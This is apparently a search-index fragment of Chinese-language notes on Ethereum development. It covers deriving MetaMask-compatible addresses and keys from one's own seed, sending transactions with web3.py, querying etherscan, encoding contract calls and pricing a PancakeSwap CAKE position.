MetaMask\u7b49\u94b1\u5305\u7684\u5de5\u4f5c\u539f\u7406\u662f\u4ece\u4e00\u4e32seed phrase\u751f\u6210\u4e00\u7cfb\u5217\u79c1\u94a5 \u4f7f\u7528 lightwallet \u8fd9\u4e2anpm\u5305\u6765\u751f\u6210MetaMask\u517c\u5bb9\u76841000\u4e2a\u5730\u5740 # \u9700\u8981\u4f7f\u7528\u7248\u672c2\uff0c\u66f4\u65b0\u7684\u7248\u672c\u4fee\u6539\u4e86API\u9700\u8981\u63d0\u4f9bsalt $ npm install eth - lightwallet @2.5.6 # \u4fee\u6539node_modules\\_bitcore-lib@8.14.4@bitcore-lib\\index.js\u6dfb\u52a0\u4e00\u4e2areturn # bitcore.versionGuard = function(version) {return; var lightwallet = require ( \"eth-lightwallet\" ); var secretSeed = \u4ece metamask\u590d\u5236 var password = \u968f\u610f\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\uff0c\u5728\u5185\u5b58\u4e2d\u5b58\u50a8\u7684\u662f\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u52a0\u5bc6\u540e\u7684\u79c1\u94a5 var hdPathString = \"m/44'/60'/0'/0\" ; var ks ; lightwallet . keystore . deriveKeyFromPassword ( password , function ( err , pwDerivedKey ) { ks = new lightwallet . keystore ( secretSeed , pwDerivedKey , hdPathString ); //console.log(ks); ks . generateNewAddress ( pwDerivedKey , 1000 , hdPathString ); for ( var i of ks . getAddresses ( hdPathString )){ console . log ( i , ks . exportPrivateKey ( i , pwDerivedKey , hdPathString )); } }) Python\u53d1\u8d77\u4ea4\u6613(Web3.py) \u00b6 pip3 install web3\uff0c\u9700\u8981python3.7 \uff08 \u5728Ubuntu16.04\u4e0a\u5b89\u88c5Python 3.7 \uff09 \u5728infura.io\u6ce8\u518c\uff0c\u5f97\u5230\u4e00\u4e2aproject id\uff0c\u8bbe\u7f6e\u4e3a\u73af\u5883\u53d8\u91cfWEB3_INFURA_PROJECT_ID import os os . environ [ \"WEB3_INFURA_PROJECT_ID\" ] = \"\u4eceinfura.io\u590d\u5236\" from web3.auto.infura.ropsten import w3 from base64 import b16encode def senddata ( privatekey , data , to = None , nonce = None ): addr = w3 . eth . account . privateKeyToAccount ( privatekey ) . address if not to : to = addr if not to . startswith ( \"0x\" ): to = \"0x\" + to if len ( data ) > 30 * 1024 : raise Exception ( \"data too big\" ) if nonce is None : nonce = w3 . eth . getTransactionCount ( addr ) tx = dict ( nonce = nonce , gasPrice = 2000000000 , gas = 5940000 , to = to , value = 0 , data = data ) stx = w3 . eth . account . sign_transaction ( tx , privatekey ) return b16encode ( w3 . eth . sendRawTransaction ( stx . rawTransaction )) . decode () . lower () \u5730\u5740\u4ea4\u6613\u67e5\u8be2API \u00b6 \u6ce8\u610fetherscan.io\u4f7f\u7528\u4e86cloudflare\uff0c\u5fc5\u987b\u8bbe\u7f6e\u4e00\u4e2aUser-Agent\u624d\u80fd\u8c03\u7528 \u76ee\u524d\u8fd8\u4e0d\u9700\u8981apikey\u5c31\u80fd\u76f4\u63a5\u8c03\u7528 import requests def gettx ( addr ): return requests . get ( \"https://api-ropsten.etherscan.io/api?module=account&action=txlist&address=\" + addr + \"&startblock=0&endblock=99999999&sort=asc&apikey=YourApiKeyToken\" , headers = { \"User-Agent\" : \"ethquery\" }) . json ()[ \"result\" ] \u8fd4\u56de\u7684\u6570\u7ec4\u53ef\u80fd\u6bcf\u4e2a\u4ea4\u6613\u90fd\u91cd\u590d\u4e86\u4e24\u6b21\uff0c\u9700\u8981\u53bb\u91cd\uff1a seenhash = [] for tx in gettx(addr): if len(tx[\"input\"])>2 and tx[\"hash\"] not in seenhash: # \u5904\u7406tx[\"input\"] seenhash.append(tx[\"hash\"]) \u65f6\u95f4\u6233\u8f6cblock id \u00b6 \u6709\u4e9b\u65f6\u5019\u6211\u4eec\u9700\u8981\u77e5\u9053\u7279\u5b9a\u65f6\u95f4\u70b9\u7684\u533a\u5757\u9ad8\u5ea6\uff0c\u6765\u67e5\u8be2\u5f53\u65f6\u7684\u5408\u7ea6\u6570\u636e \u4e0d\u4f9d\u8d56etherscan\u7684\u65b9\u6cd5\u53ef\u4ee5\u6309\u7167\u5f53\u524d\u533a\u5757\u9ad8\u5ea6\u3001\u5df2\u7ecf\u6d41\u901d\u7684\u65f6\u95f4\u548c \u51fa\u5757\u901f\u5ea6 \u8fdb\u884c\u8ba1\u7b97\uff0c\u7b97\u51fa\u6765\u7684blockid\u518d\u8c03\u7528web3 API\u67e5\u8be2timestamp\u518d\u6b21\u8ba1\u7b97\uff0c\u76f4\u5230\u8bef\u5dee\u5c0f\u4e8e\u9608\u503c\u5373\u53ef etherscan\u63d0\u4f9b\u4e86\u8fd9\u4e2aAPI: https://etherscan.io/apis#blocks cache = {} apikey = \"\" def timestamp2blockid ( ts , retry = 3 ) : cachekey = \"timestamp2blockid_\" + str ( ts ) if cachekey in cache : #print ( \"cache used\" ) return cache [ cachekey ] x = sess . get ( \"https://api.etherscan.io/api?module=block&action=getblocknobytime&timestamp=\" + str ( ts ) + \"&closest=before&apikey=\" + apikey ) #print ( x . json ()) if 'result' not in x . json () : if retry : print ( \"[retry] timestamp2blockid\" , ts ) return timestamp2blockid ( ts , retry = retry - 1 ) else : print ( x . json ()) res = x . json () [ \"result\" ] cache [ cachekey ] = res return res \u6839\u636e\u51fd\u6570\u540d\u8c03\u7528\u5408\u7ea6 \u00b6 \u6807\u8bb0\u4e86view\u7684\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5728etherscan\u8bfb\u53d6\u5408\u7ea6\u8c03\u7528\uff0c\u4f46\u6709\u4e9b\u51fd\u6570\u4e0d\u4f1a\u6d89\u53ca\u5199\u64cd\u4f5c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u5df1\u8c03\u7528\u800c\u4e0d\u7528\u53d1\u8d77\u94fe\u4e0a\u4ea4\u6613\uff08\u5373\u4f7f\u4ea4\u6613\u4e5f\u62ff\u4e0d\u5230\u8fd4\u56de\u503c\uff09 \u9996\u5148\u6211\u4eec\u9700\u8981\u4e86\u89e3eth_call\u7684data \u524d4\u4e2a\u5b57\u8282\u5c31\u662f\u51fd\u6570\u7b7e\u540d\u7684\u54c8\u5e0c\uff0c\u54c8\u5e0c\u7b97\u6cd5\u662fkeccak_sha3\u53d6\u524d4\u4e2a\u5b57\u8282 \u8fd9\u4e1c\u897f\u53eb\u505aABI\uff0c \u6587\u6863\uff1a https://solidity.readthedocs.io/en/v0.5.3/abi-spec.html \u4f8b\u5982balanceOf\u51fd\u6570\u53ea\u63a5\u53d7\u4e00\u4e2a\u5730\u5740\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b83\u7684\u7b7e\u540d\u5c31\u662f balanceOf(address) \uff0c\u54c8\u5e0c\u662f 70a08231 \uff0c\u4f60\u53ef\u4ee5\u89c2\u5bdfmetamask\u540e\u53f0\u53d1\u9001\u7684\u6d41\u91cf\u5c31\u53ef\u4ee5\u786e\u8ba4\u8fd9\u4e00\u70b9 \u4f7f\u7528Python\u4e0d\u4f9d\u8d56web3\u8ba1\u7b97\u8fd9\u4e2a\u54c8\u5e0c\uff1a \u4f60\u53ef\u80fd\u9700\u8981 python3 -m pip install pycryptodome from Crypto.Hash import keccak def function_hash ( func_str ): return keccak . new ( digest_bits = 256 ) . update ( func_str . encode ( \"utf-8\" )) . hexdigest ()[: 8 ] \u6709\u4e86\u51fd\u6570\u54c8\u5e0c\u540e \u518d\u62fc\u63a5\u51fd\u6570\u8c03\u7528\u53c2\u6570\u5c31\u80fd\u53d1\u8d77eth_call\u4e86\uff0c\u6bd4\u5982\u6211\u4eec\u9700\u8981\u628a\u5730\u5740\u5728\u5de6\u8fb9\u88650\u8865\u9f50\u523064\u5b57\u8282\uff08\u4e5f\u5c31\u662f256bit\uff09 import requests sess = requests . session () sess . headers . update ({ \"Content-Type\" : \"application/json\" }) WEB3_ENDPOINT = \"\" #change to your infura.io project url def addrtoarg ( addr ): return addr . lower () . rjust ( 64 , \"0\" ) cache = {} def callfunction ( addr , func_str , args_str , blockid , returnint = True , usecache = False ): cachekey = \"_\" . join (( \"callfunction\" , addr , func_str , args_str , str ( blockid ))) try : height = hex ( int ( blockid )) except : height = blockid if usecache and cachekey in cache and blockid != \"latest\" : res = cache [ cachekey ] else : data = { \"id\" : 1 , \"jsonrpc\" : \"2.0\" , \"method\" : \"eth_call\" , \"params\" :[{ \"data\" : \"0x\" + function_hash ( func_str ) + args_str , \"to\" : addr ,}, height ] } x = sess . post ( WEB3_ENDPOINT , json = data ) print ( x . json ()) res = x . json ()[ \"result\" ] if usecache : cache [ cachekey ] = res if not returnint : return res else : return int ( res , 16 ) \u5176\u4e2dWEB3_ENDPOINT\u53ef\u4ee5\u662finfura\u81ea\u5df1\u6ce8\u518c\u4e00\u4e2aAPIKEY\u540e\u5f97\u5230\u7684\u5730\u5740 \u8981\u83b7\u53d6\u6700\u65b0\u7684\u6570\u636e\u8fd8\u9700\u8981\u77e5\u9053\u5f53\u524d\u7684\u533a\u5757\u9ad8\u5ea6\uff1a def eth_blockNumber(): return int(sess.post(WEB3_ENDPOINT, data='{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[]}').json()[\"result\"], 16) \u8c03\u7528\u5f88\u7b80\u5355\uff1a mybalance = callfunction(contract_address, \"balanceOfUnderlying(address)\", addrtoarg(my_address), eth_blockNumber()) \u66f4\u590d\u6742\u7684\u53c2\u6570\u7c7b\u578b \u00b6 \u5bf9\u4e8estring\u8fd9\u79cd\u53ef\u53d8\u957f\u5ea6\u7c7b\u578b\uff0c\u8fd8\u662f\u4f7f\u7528python\u5305 eth-abi \u5427\uff0c\u4f8b\u5982\uff1a NFT-Hero\u91cc\u968f\u673a\u6570\u7528\u7684blockhashMgr\u5230\u5e95\u662f\u4ec0\u4e48\u5408\u7ea6\u5462\uff1a https://github.com/nfthero/SuperHero/blob/c87346f36efb09667ad8f0eeaf8df04a710bbecd/Package.sol#L87 \u5c31\u60f3\u8981\u67e5\u8be2\u4e00\u4e0bmembers\u8fd9\u4e2a\u5b57\u5178\uff0c\u5176\u7c7b\u578b\u662f mapping(string => address) public members \uff0c\u4e5f\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u8c03\u7528 members(string) \u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u67e5\u8be2\uff1a >>> callfunction(\"https://http-mainnet-node.huobichain.com/\", \"0x42C1aC2AeAEc52E1cc9dC8057b089FA91fa84FC7\", \"members(string)\", base64.b16encode(eth_abi.encode_abi([\"string\"], [\"blockhashMgr\"])).decode().lower(), \"latest\", False) '0x0000000000000000000000003e259bfe720093abb26a2c3fe57670259b2ebea2' \u5b9e\u4f8b\uff1a\u83b7\u53d6Cake\u6301\u4ed3\u4ef7\u503c \u00b6 Warning \u672c\u6587\u4e0d\u4f5c\u4e3a\u6295\u8d44\u5efa\u8bae\uff0c\u672c\u9879\u76ee\u5408\u7ea6\u4ee3\u78012020/11/05\u4e5f\u51fa\u8fc7 \u6f0f\u6d1e\u5bfc\u81f4\u6316\u77ff\u5956\u52b1\u4ee3\u5e01\u8d85\u53d1 \u5e01\u5b89\u667a\u80fd\u94fe\u4e0a\u6709\u4e2a\u6284\u4e86Uniswap\u7684 pancakeswap , \u7f51\u9875\u4e0a\u5f53\u524d(2021/01/06)\u663e\u793a\u8d28\u62bcCAKE\u7684\u5e74\u5316228%\uff0c\u90a3\u5f53\u7136\u662f\u5c1d\u8bd5\u4e00\u4e0b\u54af\uff0c\u4e8e\u662f\u81ea\u7136\u6709\u4e86\u9700\u6c42\uff1a\u8ba1\u7b97\u81ea\u5df1\u6301\u4ed3CAKE\u7684\u5b9e\u65f6\u4ef7\u503c\uff0c\u6301\u4ed3\u5305\u542b\u8d28\u62bc\u5956\u52b1\u7684\u90e8\u5206 \u90a3\u4e48\u5b9e\u73b0\u8fd9\u4e2a\u9700\u6c42\u5c31\u9700\u8981\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff1a\u5982\u4f55\u83b7\u53d6\u81ea\u5df1\u7684CAKE\u5956\u52b1\u6570\u91cf\uff0c\u5982\u4f55\u83b7\u53d6CAKE\u7684\u4ef7\u683c\u4fe1\u606f \u7b2c\u4e00\u4e2a\u95ee\u9898\u597d\u89e3\u51b3\uff0c\u6309\u7167\u4e0a\u9762\u8c03\u7528\u5408\u7ea6\u5373\u53ef\uff0c\u5408\u7ea6\u8c03\u7528\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u5373\u4f7f\u4e0d\u77e5\u9053\u51fd\u6570\u9009\u62e9\u5668\u548c\u51fd\u6570\u53c2\u6570\u600e\u4e48\u5199\uff0c\u4e5f\u53ef\u4ee5\u8ba9etherscan\u6765\u5e2e\u6211\u4eec\u8c03\u7528 \u5408\u7ea6 \u770b\u6d41\u91cf\u5373\u53ef WEB3_ENDPOINT='https://bsc-dataseed.binance.org/' callfunction(contract_address, \"pendingCake(uint256,address)\", \"0\"*64+addrtoarg(my_address), \"latest\", usecache=False)/10**18 \u7b2c\u4e8c\u4e2a\u95ee\u9898\uff1a\u83b7\u53d6CAKE\u7684\u4ef7\u503c \u53ef\u4ee5\u5728 pancakeswap.info\u7684token\u9875\u9762 \u770b\u5230 \u5f53\u524dCAKE\u7684\u4ef7\u503c\u663e\u793a\u4e3a$0.64 \u901a\u8fc7\u4ed4\u7ec6\u7ffb\u6d41\u91cf+F12\u770b\u524d\u7aefjs+\u5b66GraphQL\u7684\u5199\u6cd5\uff0c\u53d1\u73b0\u8fd9\u4e2a\u56fe\u67e5\u8be2\u53ef\u4ee5\u4e00\u6b21\u8fd4\u56de\u4e24\u4e2a\u5185\u5bb9\uff1a https://api.bscgraph.org/subgraphs/name/wowswap/graphql { tokens(where: {id: \"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82\"}) { id name symbol derivedETH tradeVolume tradeVolumeUSD untrackedVolumeUSD totalLiquidity txCount __typename } bundles(where: {id: 1}) { id ethPrice __typename } } \u67e5\u8be2\u5230\uff1a { \"data\": { \"bundles\": [ { \"__typename\": \"Bundle\", \"ethPrice\": \"40.4164616943543110107673755202366\", \"id\": \"1\" } ], \"tokens\": [ { \"__typename\": \"Token\", \"derivedETH\": \"0.01577253120396104706816941010842497\", \"id\": \"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82\", \"name\": \"PancakeSwap Token\", \"symbol\": \"Cake\", \"totalLiquidity\": \"17457173.064252540875767782\", \"tradeVolume\": \"529331425.317628506590140745\", \"tradeVolumeUSD\": \"270335080.4687124727090581348114777\", \"txCount\": \"659265\", \"untrackedVolumeUSD\": \"331587403.3835248774831009549837749\" } ] } } \u5c06\u5176\u4e2d\u7684 ethPrice (\u5b9e\u9645\u4e0a\u662fBNB\u7684\u4ef7\u683c)\u548c derivedETH \u4e58\u8d77\u6765\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684\u4ef7\u683c\u4e86\uff0c\u7b97\u51fa\u6765\u662f $0.6375 \u901a\u7528\u4e00\u70b9\u8fd8\u9700\u8981\u8c03\u7528\u5408\u7ea6 userInfo(uint256,address) \u67e5\u8be2\u81ea\u5df1\u7684\u6301\u4ed3\uff0c\u6700\u540e\u5408\u5728\u4e00\u8d77\uff1a (\u81ea\u5df1\u7684\u6301\u4ed3+pendingpendingCake)*derivedETH*ethPrice","title":"ETH"},{"location":"ETH/#eth","text":"\u5b66\u4e60\u4e00\u4e0b\u4ee5\u592a\u574a\uff0c\u76ee\u524d\u53ef\u4ee5\u5728\u533a\u5757\u94fe\u4e0a\u523b\u5b57\u4e86\uff0c\u6bcf\u4e2a\u4ea4\u6613\u53ef\u4ee5\u5b58\u50a830K\u7684\u5185\u5bb9","title":"ETH"},{"location":"ETH/#ropsteneth","text":"\u76ee\u524d\u7684faucet\u5217\u8868\uff0c\u4e0d\u8fc7\u6709\u53ef\u80fd\u4ed6\u4eec\u5de5\u4f5c\u5728fork\u4e0a\uff0c\u83b7\u5f97\u7684eth\u4e0d\u80fd\u5728etherscan\u4e0a\u770b\u5230 \u8fd1\u671f\u4ee5\u592a\u574aRopsten\u6d4b\u8bd5\u7f51\u7684Istanbul\u5347\u7ea7\u7531\u4e8e\u5927\u90e8\u5206\u7b97\u529b\u6ca1\u6709\u5347\u7ea7\u8282\u70b9\u8f6f\u4ef6\uff0c\u5b9e\u9645\u4e0a\u5df2\u7ecf\u53d1\u751f\u4e86\u5206\u53c9 https://faucet.ropsten.be https://faucet.metamask.io http://faucet.bitfwd.xyz","title":"\u83b7\u53d6\u6d4b\u8bd5\u7f51\u7edcropsten\u7684ETH"},{"location":"ETH/#metamask","text":"MetaMask\u7b49\u94b1\u5305\u7684\u5de5\u4f5c\u539f\u7406\u662f\u4ece\u4e00\u4e32seed phrase\u751f\u6210\u4e00\u7cfb\u5217\u79c1\u94a5 \u4f7f\u7528 lightwallet \u8fd9\u4e2anpm\u5305\u6765\u751f\u6210MetaMask\u517c\u5bb9\u76841000\u4e2a\u5730\u5740 # \u9700\u8981\u4f7f\u7528\u7248\u672c2\uff0c\u66f4\u65b0\u7684\u7248\u672c\u4fee\u6539\u4e86API\u9700\u8981\u63d0\u4f9bsalt $ npm install eth - lightwallet @2.5.6 # \u4fee\u6539node_modules\\_bitcore-lib@8.14.4@bitcore-lib\\index.js\u6dfb\u52a0\u4e00\u4e2areturn # bitcore.versionGuard = function(version) {return; var lightwallet = require ( \"eth-lightwallet\" ); var secretSeed = \u4ece metamask\u590d\u5236 var password = \u968f\u610f\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\uff0c\u5728\u5185\u5b58\u4e2d\u5b58\u50a8\u7684\u662f\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u52a0\u5bc6\u540e\u7684\u79c1\u94a5 var hdPathString = \"m/44'/60'/0'/0\" ; var ks ; lightwallet . keystore . deriveKeyFromPassword ( password , function ( err , pwDerivedKey ) { ks = new lightwallet . keystore ( secretSeed , pwDerivedKey , hdPathString ); //console.log(ks); ks . generateNewAddress ( pwDerivedKey , 1000 , hdPathString ); for ( var i of ks . getAddresses ( hdPathString )){ console . log ( i , ks . exportPrivateKey ( i , pwDerivedKey , hdPathString )); } })","title":"\u751f\u6210\u4e00\u5806\u4e0eMetaMask\u517c\u5bb9\u7684\u5730\u5740"},{"location":"ETH/#pythonweb3py","text":"pip3 install web3\uff0c\u9700\u8981python3.7 \uff08 \u5728Ubuntu16.04\u4e0a\u5b89\u88c5Python 3.7 \uff09 \u5728infura.io\u6ce8\u518c\uff0c\u5f97\u5230\u4e00\u4e2aproject id\uff0c\u8bbe\u7f6e\u4e3a\u73af\u5883\u53d8\u91cfWEB3_INFURA_PROJECT_ID import os os . environ [ \"WEB3_INFURA_PROJECT_ID\" ] = \"\u4eceinfura.io\u590d\u5236\" from web3.auto.infura.ropsten import w3 from base64 import b16encode def senddata ( privatekey , data , to = None , nonce = None ): addr = w3 . eth . account . privateKeyToAccount ( privatekey ) . address if not to : to = addr if not to . startswith ( \"0x\" ): to = \"0x\" + to if len ( data ) > 30 * 1024 : raise Exception ( \"data too big\" ) if nonce is None : nonce = w3 . eth . getTransactionCount ( addr ) tx = dict ( nonce = nonce , gasPrice = 2000000000 , gas = 5940000 , to = to , value = 0 , data = data ) stx = w3 . eth . account . sign_transaction ( tx , privatekey ) return b16encode ( w3 . eth . sendRawTransaction ( stx . rawTransaction )) . decode () . lower ()","title":"Python\u53d1\u8d77\u4ea4\u6613(Web3.py)"},{"location":"ETH/#api","text":"\u6ce8\u610fetherscan.io\u4f7f\u7528\u4e86cloudflare\uff0c\u5fc5\u987b\u8bbe\u7f6e\u4e00\u4e2aUser-Agent\u624d\u80fd\u8c03\u7528 \u76ee\u524d\u8fd8\u4e0d\u9700\u8981apikey\u5c31\u80fd\u76f4\u63a5\u8c03\u7528 import requests def gettx ( addr ): return requests . get ( \"https://api-ropsten.etherscan.io/api?module=account&action=txlist&address=\" + addr + \"&startblock=0&endblock=99999999&sort=asc&apikey=YourApiKeyToken\" , headers = { \"User-Agent\" : \"ethquery\" }) . json ()[ \"result\" ] \u8fd4\u56de\u7684\u6570\u7ec4\u53ef\u80fd\u6bcf\u4e2a\u4ea4\u6613\u90fd\u91cd\u590d\u4e86\u4e24\u6b21\uff0c\u9700\u8981\u53bb\u91cd\uff1a seenhash = [] for tx in gettx(addr): if len(tx[\"input\"])>2 and tx[\"hash\"] not in seenhash: # \u5904\u7406tx[\"input\"] seenhash.append(tx[\"hash\"])","title":"\u5730\u5740\u4ea4\u6613\u67e5\u8be2API"},{"location":"ETH/#block-id","text":"\u6709\u4e9b\u65f6\u5019\u6211\u4eec\u9700\u8981\u77e5\u9053\u7279\u5b9a\u65f6\u95f4\u70b9\u7684\u533a\u5757\u9ad8\u5ea6\uff0c\u6765\u67e5\u8be2\u5f53\u65f6\u7684\u5408\u7ea6\u6570\u636e \u4e0d\u4f9d\u8d56etherscan\u7684\u65b9\u6cd5\u53ef\u4ee5\u6309\u7167\u5f53\u524d\u533a\u5757\u9ad8\u5ea6\u3001\u5df2\u7ecf\u6d41\u901d\u7684\u65f6\u95f4\u548c \u51fa\u5757\u901f\u5ea6 \u8fdb\u884c\u8ba1\u7b97\uff0c\u7b97\u51fa\u6765\u7684blockid\u518d\u8c03\u7528web3 API\u67e5\u8be2timestamp\u518d\u6b21\u8ba1\u7b97\uff0c\u76f4\u5230\u8bef\u5dee\u5c0f\u4e8e\u9608\u503c\u5373\u53ef etherscan\u63d0\u4f9b\u4e86\u8fd9\u4e2aAPI: https://etherscan.io/apis#blocks cache = {} apikey = \"\" def timestamp2blockid ( ts , retry = 3 ) : cachekey = \"timestamp2blockid_\" + str ( ts ) if cachekey in cache : #print ( \"cache used\" ) return cache [ cachekey ] x = sess . get ( \"https://api.etherscan.io/api?module=block&action=getblocknobytime&timestamp=\" + str ( ts ) + \"&closest=before&apikey=\" + apikey ) #print ( x . json ()) if 'result' not in x . json () : if retry : print ( \"[retry] timestamp2blockid\" , ts ) return timestamp2blockid ( ts , retry = retry - 1 ) else : print ( x . json ()) res = x . json () [ \"result\" ] cache [ cachekey ] = res return res","title":"\u65f6\u95f4\u6233\u8f6cblock id"},{"location":"ETH/#_1","text":"\u6807\u8bb0\u4e86view\u7684\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5728etherscan\u8bfb\u53d6\u5408\u7ea6\u8c03\u7528\uff0c\u4f46\u6709\u4e9b\u51fd\u6570\u4e0d\u4f1a\u6d89\u53ca\u5199\u64cd\u4f5c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u5df1\u8c03\u7528\u800c\u4e0d\u7528\u53d1\u8d77\u94fe\u4e0a\u4ea4\u6613\uff08\u5373\u4f7f\u4ea4\u6613\u4e5f\u62ff\u4e0d\u5230\u8fd4\u56de\u503c\uff09 \u9996\u5148\u6211\u4eec\u9700\u8981\u4e86\u89e3eth_call\u7684data \u524d4\u4e2a\u5b57\u8282\u5c31\u662f\u51fd\u6570\u7b7e\u540d\u7684\u54c8\u5e0c\uff0c\u54c8\u5e0c\u7b97\u6cd5\u662fkeccak_sha3\u53d6\u524d4\u4e2a\u5b57\u8282 \u8fd9\u4e1c\u897f\u53eb\u505aABI\uff0c \u6587\u6863\uff1a https://solidity.readthedocs.io/en/v0.5.3/abi-spec.html \u4f8b\u5982balanceOf\u51fd\u6570\u53ea\u63a5\u53d7\u4e00\u4e2a\u5730\u5740\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b83\u7684\u7b7e\u540d\u5c31\u662f balanceOf(address) \uff0c\u54c8\u5e0c\u662f 70a08231 \uff0c\u4f60\u53ef\u4ee5\u89c2\u5bdfmetamask\u540e\u53f0\u53d1\u9001\u7684\u6d41\u91cf\u5c31\u53ef\u4ee5\u786e\u8ba4\u8fd9\u4e00\u70b9 \u4f7f\u7528Python\u4e0d\u4f9d\u8d56web3\u8ba1\u7b97\u8fd9\u4e2a\u54c8\u5e0c\uff1a \u4f60\u53ef\u80fd\u9700\u8981 python3 -m pip install pycryptodome from Crypto.Hash import keccak def function_hash ( func_str ): return keccak . new ( digest_bits = 256 ) . update ( func_str . encode ( \"utf-8\" )) . hexdigest ()[: 8 ] \u6709\u4e86\u51fd\u6570\u54c8\u5e0c\u540e \u518d\u62fc\u63a5\u51fd\u6570\u8c03\u7528\u53c2\u6570\u5c31\u80fd\u53d1\u8d77eth_call\u4e86\uff0c\u6bd4\u5982\u6211\u4eec\u9700\u8981\u628a\u5730\u5740\u5728\u5de6\u8fb9\u88650\u8865\u9f50\u523064\u5b57\u8282\uff08\u4e5f\u5c31\u662f256bit\uff09 import requests sess = requests . session () sess . headers . update ({ \"Content-Type\" : \"application/json\" }) WEB3_ENDPOINT = \"\" #change to your infura.io project url def addrtoarg ( addr ): return addr . lower () . rjust ( 64 , \"0\" ) cache = {} def callfunction ( addr , func_str , args_str , blockid , returnint = True , usecache = False ): cachekey = \"_\" . join (( \"callfunction\" , addr , func_str , args_str , str ( blockid ))) try : height = hex ( int ( blockid )) except : height = blockid if usecache and cachekey in cache and blockid != \"latest\" : res = cache [ cachekey ] else : data = { \"id\" : 1 , \"jsonrpc\" : \"2.0\" , \"method\" : \"eth_call\" , \"params\" :[{ \"data\" : \"0x\" + function_hash ( func_str ) + args_str , \"to\" : addr ,}, height ] } x = sess . post ( WEB3_ENDPOINT , json = data ) print ( x . json ()) res = x . json ()[ \"result\" ] if usecache : cache [ cachekey ] = res if not returnint : return res else : return int ( res , 16 ) \u5176\u4e2dWEB3_ENDPOINT\u53ef\u4ee5\u662finfura\u81ea\u5df1\u6ce8\u518c\u4e00\u4e2aAPIKEY\u540e\u5f97\u5230\u7684\u5730\u5740 \u8981\u83b7\u53d6\u6700\u65b0\u7684\u6570\u636e\u8fd8\u9700\u8981\u77e5\u9053\u5f53\u524d\u7684\u533a\u5757\u9ad8\u5ea6\uff1a def eth_blockNumber(): return int(sess.post(WEB3_ENDPOINT, data='{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[]}').json()[\"result\"], 16) \u8c03\u7528\u5f88\u7b80\u5355\uff1a mybalance = callfunction(contract_address, \"balanceOfUnderlying(address)\", addrtoarg(my_address), eth_blockNumber())","title":"\u6839\u636e\u51fd\u6570\u540d\u8c03\u7528\u5408\u7ea6"},{"location":"ETH/#_2","text":"\u5bf9\u4e8estring\u8fd9\u79cd\u53ef\u53d8\u957f\u5ea6\u7c7b\u578b\uff0c\u8fd8\u662f\u4f7f\u7528python\u5305 eth-abi \u5427\uff0c\u4f8b\u5982\uff1a NFT-Hero\u91cc\u968f\u673a\u6570\u7528\u7684blockhashMgr\u5230\u5e95\u662f\u4ec0\u4e48\u5408\u7ea6\u5462\uff1a https://github.com/nfthero/SuperHero/blob/c87346f36efb09667ad8f0eeaf8df04a710bbecd/Package.sol#L87 \u5c31\u60f3\u8981\u67e5\u8be2\u4e00\u4e0bmembers\u8fd9\u4e2a\u5b57\u5178\uff0c\u5176\u7c7b\u578b\u662f mapping(string => address) public members \uff0c\u4e5f\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u8c03\u7528 members(string) \u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u67e5\u8be2\uff1a >>> callfunction(\"https://http-mainnet-node.huobichain.com/\", \"0x42C1aC2AeAEc52E1cc9dC8057b089FA91fa84FC7\", \"members(string)\", base64.b16encode(eth_abi.encode_abi([\"string\"], [\"blockhashMgr\"])).decode().lower(), \"latest\", False) '0x0000000000000000000000003e259bfe720093abb26a2c3fe57670259b2ebea2'","title":"\u66f4\u590d\u6742\u7684\u53c2\u6570\u7c7b\u578b"},{"location":"ETH/#cake","text":"Warning \u672c\u6587\u4e0d\u4f5c\u4e3a\u6295\u8d44\u5efa\u8bae\uff0c\u672c\u9879\u76ee\u5408\u7ea6\u4ee3\u78012020/11/05\u4e5f\u51fa\u8fc7 \u6f0f\u6d1e\u5bfc\u81f4\u6316\u77ff\u5956\u52b1\u4ee3\u5e01\u8d85\u53d1 \u5e01\u5b89\u667a\u80fd\u94fe\u4e0a\u6709\u4e2a\u6284\u4e86Uniswap\u7684 pancakeswap , \u7f51\u9875\u4e0a\u5f53\u524d(2021/01/06)\u663e\u793a\u8d28\u62bcCAKE\u7684\u5e74\u5316228%\uff0c\u90a3\u5f53\u7136\u662f\u5c1d\u8bd5\u4e00\u4e0b\u54af\uff0c\u4e8e\u662f\u81ea\u7136\u6709\u4e86\u9700\u6c42\uff1a\u8ba1\u7b97\u81ea\u5df1\u6301\u4ed3CAKE\u7684\u5b9e\u65f6\u4ef7\u503c\uff0c\u6301\u4ed3\u5305\u542b\u8d28\u62bc\u5956\u52b1\u7684\u90e8\u5206 \u90a3\u4e48\u5b9e\u73b0\u8fd9\u4e2a\u9700\u6c42\u5c31\u9700\u8981\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff1a\u5982\u4f55\u83b7\u53d6\u81ea\u5df1\u7684CAKE\u5956\u52b1\u6570\u91cf\uff0c\u5982\u4f55\u83b7\u53d6CAKE\u7684\u4ef7\u683c\u4fe1\u606f 